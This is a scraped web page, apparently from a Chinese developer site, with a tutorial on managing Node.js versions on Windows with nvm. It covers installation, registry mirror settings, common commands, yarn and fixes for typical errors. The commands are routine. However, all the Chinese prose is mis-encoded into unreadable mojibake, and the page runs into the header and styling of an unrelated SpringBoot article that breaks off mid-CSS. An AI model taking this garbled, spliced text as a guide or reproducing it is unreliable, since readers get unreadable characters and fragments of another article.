<h1 class="article-title" data-v-61fb5e44="">
            ã€å·¥å…·ç¯‡ã€‘ä½¿ç”¨ nvm è¿›è¡Œ node ç‰ˆæœ¬ç®¡ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/729731452122382/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é—²äº‘ä¸€é¹¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:29:35.000Z" title="Tue Dec 30 2025 02:29:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å½“æ¥è§¦çš„é¡¹ç›®è¿‡å¤šæ—¶å°±ä¼šå‘ç°ï¼Œç‰¹å–µçš„æ€ä¹ˆæ¯ä¸ªé¡¹ç›®çš„ node.js ç‰ˆæœ¬éƒ½ä¸ä¸€è‡´ï¼Ÿï¼</p>
<p>ä½ç‰ˆæœ¬ node æ— æ³•è¿è¡Œé«˜ç‰ˆæœ¬é¡¹ç›®ï¼Œé«˜ç‰ˆæœ¬ node åˆä¸å…¼å®¹ä½ç‰ˆæœ¬é¡¹ç›®</p>
<p>å¦‚ä½•å¿«é€Ÿçš„æ¥å›åˆ‡æ¢ node ç‰ˆæœ¬æˆä¸ºäº†æ¯ä¸€åå‰ç«¯åŒä»çš„å¿…å¤‡æŠ€èƒ½</p>
<p>ä¸ºè§£å†³æ­¤ç—›ç‚¹ï¼Œå¸‚é¢ä¸Šå‡ºç°äº†å¾ˆå¤šçš„ node ç‰ˆæœ¬ç®¡ç†å·¥å…·ï¼šnvmã€nvsã€Voltaã€fnm ç­‰ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ nvm ä½œæ•™ç¨‹è®²è§£</p>
<h2 data-id="heading-1">1. å®‰è£… nvm</h2>
<blockquote>
<p>æ³¨æ„ï¼šå®‰è£… nvm ä¹‹å‰ï¼Œä¸€å®šå¾—å…ˆå¸è½½å¹²å‡€ node.jsï¼ï¼ï¼</p>
</blockquote>
<blockquote>
<p>æ³¨æ„ï¼šæœ‰äº† nvm å°±ä¸éœ€è¦å•ç‹¬å®‰è£… node äº†ï¼Œç›´æ¥ä½¿ç”¨ nvm å®‰è£…åˆ‡æ¢ node ç‰ˆæœ¬å³å¯</p>
</blockquote>
<p>windows é€‚ç”¨ç‰ˆæœ¬ä¸º nvm-windowsï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoreybutler%2Fnvm-windows%2Freleases" target="_blank" title="https://github.com/coreybutler/nvm-windows/releases" ref="nofollow noopener noreferrer">github.com/coreybutlerâ€¦</a></p>
<p>ä¸‹è½½å®‰è£…åŒ…ï¼ˆ<code>nvm-setup.exe</code>ï¼‰å®‰è£…åˆ°æœ¬åœ°(é€‰æ‹©é»˜è®¤å®‰è£…è·¯å¾„å¹¶ä¸”ä¸€ç›´ç‚¹å‡»ä¸‹ä¸€æ­¥å³å¯)ï¼Œæ³¨æ„è‡ªå®šä¹‰è·¯å¾„æ³¨æ„ä¸èƒ½æœ‰ä¸­æ–‡æˆ–è€…ç©ºæ ¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f81107733104ddfadc843d7fd552999~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=lfBGoYc5atQTkMZMXLgl0n%2BX1l4%3D" alt="1.png" loading="lazy"/></p>
<p>æç¤ºï¼è®°ä½è¿™é‡Œçš„å®‰è£…ç›®å½•ï¼Œåé¢ç”¨å¾—ä¸Šï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a78f7545b8245919f7900b2272ce7a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=R4%2F1NodkR%2Bs4uqmLEWhD0%2FVisXE%3D" alt="2.png" loading="lazy"/></p>
<h2 data-id="heading-2">2. node å®‰è£…ä¸åˆ‡æ¢</h2>
<p>è¾“å…¥å‘½ä»¤ <code>nvm v</code> èƒ½æ˜¾ç¤ºå½“å‰ nvm ç‰ˆæœ¬å·å³è¯´æ˜å®‰è£…æˆåŠŸ</p>
<p>ç„¶åä¸‹è½½ä¸€ä¸ª node ç‰ˆæœ¬</p>
<pre><code class="hljs language-bash" lang="bash">nvm install 16
</code></pre>
<p>åˆ‡æ¢åˆ° node 16</p>
<pre><code class="hljs language-bash" lang="bash">nvm use 16
</code></pre>
<p>æŸ¥çœ‹ nvm ä¸­å®‰è£…çš„ node ç‰ˆæœ¬åˆ—è¡¨ï¼Œä»¥åŠå½“å‰æ‰€é€‰æ‹©ç‰ˆæœ¬ï¼ˆæ˜Ÿå·ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash">nvm list
</code></pre>
<p>ç„¶åå°±å¯ä»¥é€šè¿‡ <code>node -v</code> å’Œ <code>npm -v</code> å‘½ä»¤æŸ¥è¯¢åˆ°å½“å‰çš„ node å’Œ npm ç‰ˆæœ¬äº†</p>
<p>æ³¨æ„ï¼npm ç‰ˆæœ¬æ˜¯è·Ÿéš node ç‰ˆæœ¬å˜åŠ¨çš„ï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5aa40abca5a54ea98d38b72ee6cc87c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=CEASUCLzrpzcDZCPbjUweltp0Wk%3D" alt="3.png" loading="lazy"/></p>
<h2 data-id="heading-3">3. è®¾ç½®æ·˜å®æº</h2>
<blockquote>
<p>ç”±äºå›½å†…ç½‘ç»œç­‰åŸå› ï¼Œä½¿ç”¨ mpm install xxx å®‰è£…ä¾èµ–åŒ…çš„è¿‡ç¨‹ä¸­ä¼šå‡ºç°å®‰è£…è¿‡æ…¢ä»¥åŠå¤±è´¥å¯¼è‡´æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ npm é•œåƒæºæŒ‡å‘å›½å†…<code>æ·˜å® npm é•œåƒæº</code></p>
</blockquote>
<p>å‰é¢æé†’çš„ nvm å®‰è£…ç›®å½•è¿˜è®°å¾—ä½å—ï¼Ÿé»˜è®¤ç›®å½•ä¸€èˆ¬åœ¨è¿™ä¸ªä½ç½®â€œC:\Users\ä½ çš„ç”¨æˆ·å\AppData\Local\nvmâ€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1539a6c819c4d5a9ef45b2f5aea7752~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=IDLh0noUliy%2Fzna%2FZ3p4IbDo8TQ%3D" alt="4.png" loading="lazy"/></p>
<p>å¦‚æœå®åœ¨æ‰¾ä¸åˆ°äº†ï¼Œå°±å†é‡æ–°å®‰è£…ä¸€æ¬¡å§</p>
<p>éª—ä½ çš„å“ˆå“ˆï¼Œå¯ä»¥ cmd è¿è¡Œ<code>nvm root</code>è¿™ä¸ªå‘½ä»¤æŸ¥çœ‹ nvm çš„å®‰è£…æ ¹è·¯å¾„åœ¨å“ªä¸ªæ–‡ä»¶å¤¹</p>
<p>æ‰¾åˆ° nvm å®‰è£…ç›®å½•ä¸‹é¢çš„ <code>settings.txt</code> æ–‡ä»¶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec756a53004e426bbbef4e74303d6faf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=VZEMqylOLsGR%2F%2FL%2BqYXFmCmJH84%3D" alt="5.png" loading="lazy"/></p>
<p>è®°äº‹æœ¬æ‰“å¼€ â€œsettings.txtâ€ æ–‡ä»¶å¹¶åœ¨åé¢ç²˜è´´ä¸‹é¢ä¸¤å¥è¯å³å¯</p>
<pre><code class="hljs language-cmd" lang="cmd">node_mirror: https://npmmirror.com/mirrors/node/
npm_mirror: https://npmmirror.com/mirrors/npm/
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab2995b7e35342cd94453fa0a8000ee3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=fdQ%2FCDR8iBCn%2FY%2FB9DI%2Bl1pixBc%3D" alt="6.png" loading="lazy"/></p>
<p>ä»Šå nvm å®‰è£…çš„æ‰€æœ‰ node ç‰ˆæœ¬éƒ½ä¼šæŒ‡å‘æ·˜å®é•œåƒæºäº†</p>
<p>æ£€æŸ¥å½“å‰ npm é•œåƒæº</p>
<pre><code class="hljs language-bash" lang="bash">npm config get registry
</code></pre>
<p>å¦‚æœè¾“å‡ºç»“æœæŒ‡å‘æ·˜å®æº <code>https://registry.npmmirror.com</code> å³ä¿®æ”¹æˆåŠŸï¼›ä»¥åè¿è¡Œ npm xxx å‘½ä»¤å®‰è£…ä¾èµ–åŒ…å°±æ˜¯ä½¿ç”¨çš„æ·˜å® npm é•œåƒäº†ï¼›</p>
<h2 data-id="heading-4">4. nvm å¸¸ç”¨æ“ä½œå‘½ä»¤</h2>
<p>è‡³æ­¤ï¼Œnvm å·²ç»å®‰è£…æˆåŠŸï¼Œä¸‹é¢ä»‹ç»å¸¸ç”¨å‘½ä»¤</p>
<pre><code class="hljs language-bash" lang="bash">nvm v // æ˜¾ç¤ºnvmç‰ˆæœ¬

nvm root // æŸ¥çœ‹nvmçš„å®‰è£…æ ¹è·¯å¾„åœ¨å“ªä¸ªæ–‡ä»¶å¤¹

nvm list // æ˜¾ç¤ºå·²å®‰è£…nodeçš„ç‰ˆæœ¬

nvm list available // æ˜¾ç¤ºæ‰€æœ‰å¯ä»¥ä¸‹è½½çš„nodeç‰ˆæœ¬

nvm install 14.5.0 // å®‰è£…14.5.0ç‰ˆæœ¬node

nvm install latest // å®‰è£…æœ€æ–°ç‰ˆæœ¬node

nvm use 14.5.0 // ä½¿ç”¨14.5.0ç‰ˆæœ¬node

nvm uninstall 14.5.0 // å¸è½½14.5.0ç‰ˆæœ¬node
</code></pre>
<h2 data-id="heading-5">5. ä½¿ç”¨ yarn æ›¿æ¢ npm install</h2>
<p>å› ä¸º npm è®¾è®¡ä¹‹åˆçš„ä¸€äº›å†å²é—ç•™é—®é¢˜ï¼Œä½¿ç”¨ npm è¿›è¡Œä¾èµ–åŒ…çš„å®‰è£…ç»å¸¸ä¼šå‡ºç°è«åå…¶å¦™çš„é”™è¯¯ã€‚å»ºè®®å¤§å®¶ä½¿ç”¨ yarn æ›¿æ¢ npm i è¿›è¡ŒåŒ…çš„å®‰è£…</p>
<pre><code class="hljs language-bash" lang="bash">
npm install -g yarn // å…¨å±€å®‰è£…yarn

yarn -v // æŸ¥çœ‹yarnç‰ˆæœ¬

npm get registry // æŸ¥çœ‹å½“å‰yarnæº

npm config <span class="hljs-built_in">set</span> registry https://registry.npmmirror.com // æ›´æ”¹ä¸ºæ·˜å®yarnæº

yarn install // å®‰è£…package.jsoné‡Œæ‰€æœ‰åŒ…
</code></pre>
<p>å‚è€ƒæ·˜å® npm é•œåƒç«™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnpmmirror.com%2F" target="_blank" title="https://npmmirror.com/" ref="nofollow noopener noreferrer">npmmirror.com/</a></p>
<p>æ³¨æ„ï¼yarn æ˜¯è·Ÿ node ç‰ˆæœ¬è¿›è¡Œç»‘å®šçš„ï¼</p>
<h2 data-id="heading-6">6. nvm å¸¸è§æŠ¥é”™</h2>
<p>ä¸‹é¢æ˜¯æˆ‘æ›¾ç»é‡åˆ°è¿‡çš„æŠ¥é”™ï¼Œå¤§å®¶å¦‚æœç¢°åˆ°åŒæ ·çš„é—®é¢˜å¯ä»¥ä½œä¸ºå‚è€ƒ</p>
<ul>
<li>
<p>nvm åˆ‡æ¢ node æŠ¥é”™</p>
<p>æ³¨æ„ï¼šä½¿ç”¨ nvm use 14.5.0 å‘½ä»¤åˆ‡æ¢ node ç‰ˆæœ¬çš„æ—¶å€™æŠ¥é”™â€œexit status 1: ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ ã¹» ï¿½ï¿½È¨ï¿½ï¿½Ö´ï¿½Ğ´â€ï¼Œé€šè¿‡ç®¡ç†å‘˜èº«ä»½æ‰“å¼€<code>å‘½ä»¤æç¤ºç¬¦</code>åé‡æ–°è¿è¡Œå‘½ä»¤å³å¯è§£å†³</p>
<p>æ³¨æ„ï¼šå¦‚æœå‡ºç°ä¹±ç ï¼Œå¯ä»¥æ‰“å¼€ cmd å‘½ä»¤ï¼Œè¿è¡Œ<code>chcp 65001</code>ï¼Œç„¶åå°†ä¹±ç çš„è¯å¤åˆ¶æŒ‰å›è½¦ï¼Œå³å¯ç¿»è¯‘è¿™å¥ä¹±ç çš„è¯çš„æ„æ€ï¼›ç”šè‡³å°†ä¹±ç çš„è¯å¤åˆ¶åˆ° cmd å‘½ä»¤æŒ‰å›è½¦å°±å¯ä»¥ç¿»è¯‘ï¼›</p>
<p>æ³¨æ„ï¼šå¦‚æœè¿è¡Œ npm install æŠ¥é”™ <code>npm ERR! cb() never called!</code>ï¼Œå¯ä»¥é€šè¿‡åˆ‡æ¢ä¸ºåŸæ¥çš„é•œåƒæº(ä¸ä½¿ç”¨æ·˜å®é•œåƒ)æ¥è§£å†³</p>
<pre><code class="hljs language-bash" lang="bash">npm config <span class="hljs-built_in">set</span> registry https://registry.npmjs.org/
</code></pre>
</li>
<li>
<p>nvm åˆ‡æ¢ node ä¸èµ·ä½œç”¨</p>
<p>é—®é¢˜ï¼šnvm åˆ‡æ¢ node ç‰ˆæœ¬æˆåŠŸï¼ˆCurrently using 64-bit executableï¼‰ï¼Œä½†æ˜¯ node -v å´æç¤ºï¼ˆCurrently using 32-bit executableï¼‰ï¼Œç­‰äºè¯´ node ä¸€ç›´åœç•™åœ¨ä¹‹å‰ç‰ˆæœ¬ï¼Œå¹¶æ²¡æœ‰åˆ‡æ¢æˆåŠŸï¼›</p>
<p>è§£å†³åŠæ³•ï¼š1.å¸è½½å¹²å‡€ node.jsï¼› 2.é‡æ–°ä½¿ç”¨ nvm use æŒ‡å®š node ç‰ˆæœ¬ï¼›</p>
<p>å¤ç›˜å‘ç°é—®é¢˜å‡ºç°çš„åŸå› æ˜¯ï¼šnode.js ä¸å°å¿ƒå®‰è£…æˆäº† 32ï¼ˆ84ï¼‰ä½</p>
</li>
<li>
<p>vscode è¿è¡Œ yarn æŠ¥é”™</p>
<p>åœ¨ cmd é‡Œå¯ä»¥æ­£å¸¸è¿è¡Œ yarn å‘½ä»¤ï¼Œä½†æ˜¯åœ¨ vscode ä¸­è¿è¡ŒæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p>
<p><code>yarn : æ— æ³•åŠ è½½æ–‡ä»¶ C:\nvm4w\nodejs\yarn.ps1ï¼Œå› ä¸ºåœ¨æ­¤ç³»ç»Ÿä¸Šç¦æ­¢è¿è¡Œè„šæœ¬ã€‚</code></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ PowerShellã€‚è¾“å…¥ <code>set-ExecutionPolicy RemoteSigned</code>ï¼›ç„¶åé€‰æ‹© Aã€‚</p>
<p>ç„¶åå›åˆ° vscode è¿è¡Œ <code>yarn -v</code> å³å¯æ­£ç¡®æ˜¾ç¤º yarn ç‰ˆæœ¬å·</p>
</li>
<li>
<p>vscode è¿è¡Œ yarn åˆæŠ¥é”™</p>
<p>æŠ¥é”™å¦‚ä¸‹ï¼š</p>
<p><code>yarn : æ— æ³•å°†â€œyarnâ€é¡¹è¯†åˆ«ä¸º cmdletã€å‡½æ•°ã€è„šæœ¬æ–‡ä»¶æˆ–å¯è¿è¡Œç¨‹åºçš„åç§°ã€‚</code></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>ç»è¿‡æ’æŸ¥ï¼Œæ˜¯å› ä¸ºåœ¨ node ç‰ˆæœ¬ä¸º 19 çš„æ—¶å€™å®‰è£…äº† yarnï¼Œä½†æ˜¯æˆ‘åˆé€šè¿‡ nvm å°† node ç‰ˆæœ¬åˆ‡æ¢åˆ°äº† 21ï¼Œè¿è¡Œ <code>yarn -v</code>å‘½ä»¤å‘ç° yarn ç«Ÿç„¶æœªå®‰è£…ï¼ŸåŸæ¥ yarn ç«Ÿç„¶æ˜¯è·Ÿ node ç»‘å®šçš„ï¼Ÿ</p>
<p>æ‰€ä»¥æˆ‘ç”¨ nvm åˆ‡æ¢ node ä¸º 21 ç‰ˆæœ¬çš„æ—¶å€™ï¼Œè¿è¡Œå‘½ä»¤ <code>npm install -g yarn</code> é‡æ–°å®‰è£… yarnï¼Œç„¶åè¿è¡Œ<code>yarn -v</code>å‘½ä»¤æŸ¥çœ‹ yarn ç‰ˆæœ¬ï¼Œæ­£ç¡®æ˜¾ç¤º yarn ç‰ˆæœ¬ï¼Œè¡¨ç¤ºå·²ç»æˆåŠŸå®‰è£…</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼š3æ­¥è®©Wordä¹–ä¹–å˜PDF]]></title>    <link>https://juejin.cn/post/7589206614929129512</link>    <guid>https://juejin.cn/post/7589206614929129512</guid>    <pubDate>2025-12-30T02:10:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589206614929129512" data-draft-id="7589206614929113128" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼š3æ­¥è®©Wordä¹–ä¹–å˜PDF"/> <meta itemprop="keywords" content="åç«¯,Java,Spring Boot"/> <meta itemprop="datePublished" content="2025-12-30T02:10:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿç©ºç å­—"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼š3æ­¥è®©Wordä¹–ä¹–å˜PDF
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿç©ºç å­—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:10:35.000Z" title="Tue Dec 30 2025 02:10:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body 